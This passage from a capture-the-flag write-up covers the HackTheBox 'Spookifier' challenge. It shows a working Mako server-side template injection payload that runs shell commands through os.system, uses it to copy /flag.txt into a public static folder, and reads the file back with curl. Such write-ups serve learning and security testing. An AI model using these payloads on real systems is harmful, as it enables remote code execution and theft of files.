on using a payload from payloadallthings for mako (A python template engine)
```
${self.module.cache.util.os.system("id")}
```
It only shows `0`, which is the error code that `os.system` returns. Using `os.system` we will not be able to read the flag directly, but we have code execution, so we can copy the `/flag.txt` into a public directory:

```
${self.module.cache.util.os.system("cp /flag.txt /app/application/static/css")}  
```
further access the flag by using `$ curl 161.35.174.99:30548/static/css/flag.txt`


### References
https://app.hackthebox.com/challenges/Spookifier - Py SSTI 